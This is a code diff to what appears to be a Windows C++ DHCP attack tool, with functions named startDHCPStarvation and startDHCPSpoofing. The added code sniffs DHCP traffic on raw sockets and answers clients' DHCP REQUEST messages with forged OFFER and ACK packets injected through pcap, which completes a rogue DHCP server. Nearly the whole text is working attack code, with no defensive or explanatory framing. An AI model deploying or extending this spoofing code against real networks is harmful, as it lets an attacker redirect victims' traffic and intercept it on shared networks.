@@ -45,7 +45,7 @@ int sendDiscoverPacket(AddressInfo& info)
 
 
 	char* raw_packet = new char[65536];
-	CreateDHCPDiscoverPacket(raw_packet, info);
+	createDHCPDiscoverPacket(raw_packet, info);
 
 	sendto(
 		s,
@@ -59,70 +59,6 @@ int sendDiscoverPacket(AddressInfo& info)
 	return 0;
 }
 
-int recvDHCPPsackets(AddressInfo& info)
-{
-	SOCKET s;
-	sockaddr_in sockinfo;
-	sockaddr_in dst;
-	int size = sizeof(dst);
-
-	int optval = 1;
-	int in;
-	int error;
-
-	DHCP_header pDHCP{};
-	UDP_header pUDP{};
-	IP_header pIP{};
-
-	sockinfo.sin_addr.s_addr = inet_addr((const char*)info.ipv4);
-	sockinfo.sin_family = AF_INET;
-	sockinfo.sin_port = htons(0);
-
-
-	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
-
-	if (s == SOCKET_ERROR)
-	{ 
-		std::cout << "Socket error <" << WSAGetLastError() << ">" <<  std::endl;
-		WSACleanup();
-		return 1;
-	}
-		
-
-	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
-
-	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
-	{
-		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
-		WSACleanup();
-		return 1;
-	}
-	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
-
-	char* raw_packet = new char[65536];
-	memset(raw_packet, 0, 65536);
-
-	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
-
-	if (error == SOCKET_ERROR)
-	{ 
-		std::cout << " recv error: " << WSAGetLastError() << WSACleanup() << std::endl;
-		WSACleanup();
-		return 1;
-	}
-
-	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
-	if (ntohs(pUDP.dst_port) == 67)
-	{
-		if (checkForDHCP(pDHCP))
-			if (sendOfferPacket(pDHCP, pIP, info))
-				return 1;
-	}
-	delete[] raw_packet;
-	closesocket(s);
-	return 0;
-}
-
 int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
 {
 	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
@@ -130,11 +66,14 @@ int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
 	char* raw_packet = new char[65536];
 	if (!sock)
 	{
-		std::cout << "error in pcap socket" << std::endl; return 1;
+		std::cout << "error in pcap socket" << std::endl;
+		return 1;
 	}
 		
 	
-	CreateDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);
+	createDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);
+
+	printIP(((IP_header*)&raw_packet[sizeof(Ethernet_header)])->ip_destaddr);
 
 	if (pcap_sendpacket(
 		sock,
@@ -150,8 +89,25 @@ int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
 #if _DEBUG
 	std::cout << "sent" << std::endl;
 #endif
+
 	delete[] raw_packet;
 	pcap_close(sock);
+	return 0;
+}
+
+int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* sock,AddressInfo& info)
+{
+	createDHCPackPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);
+
+	if (pcap_sendpacket(
+		sock,
+		(u_char*)raw_packet,
+		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
+	) != 0)
+	{
+		std::cout << "error " << pcap_geterr(sock) << std::endl;
+		return 1;
+	}
 	return 0;
 }
 
@@ -170,6 +126,80 @@ DWORD WINAPI startDHCPStarvation(LPVOID info)
 
 DWORD WINAPI startDHCPSpoofing(LPVOID info)
 {
-	while (!recvDHCPPsackets(*(AddressInfo*)info)){}
+	SOCKET s;
+	sockaddr_in sockinfo;
+	sockaddr_in dst;
+	int size = sizeof(dst);
+
+	int optval = 1;
+	int in;
+	int error;
+	bool sent = false;
+
+	DHCP_header pDHCP{};
+	UDP_header pUDP{};
+	IP_header pIP{};
+
+	sockinfo.sin_addr.s_addr = inet_addr((const char*)(*(AddressInfo*)(info)).ipv4);
+	sockinfo.sin_family = AF_INET;
+	sockinfo.sin_port = htons(0);
+
+	//socket for recieving packets
+	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
+
+	if (s == SOCKET_ERROR)
+	{
+		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
+		WSACleanup();
+		return 1;
+	}
+
+
+	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
+
+	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
+	{
+		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
+		WSACleanup();
+		return 1;
+	}
+	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
+
+	char* raw_packet = new char[65536];
+	memset(raw_packet, 0, 65536);
+	char* ack_packet = new char[65536];
+	
+	// socket for sending ack
+	pcap_t* sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
+
+	if (!sock)
+	{
+		std::cout << "error in pcap socket" << std::endl;
+		return 1;
+	}
+
+	// listening 
+	while (!sent)
+	{
+		memset(ack_packet, 0, 65536);
+
+		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
+
+		if (error == SOCKET_ERROR)
+		{
+			std::cout << " recv error: " << WSAGetLastError() << std::endl;
+			WSACleanup();
+			return 1;
+		}
+
+		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
+
+		if (checkForDHCP(pDHCP))
+				if (getDHCPtype(pDHCP) == 3)
+					sent = sendACKPacket(ack_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
+	}
+	delete[] ack_packet;
+	delete[] raw_packet;
+	closesocket(s);
 	return -1;
 }
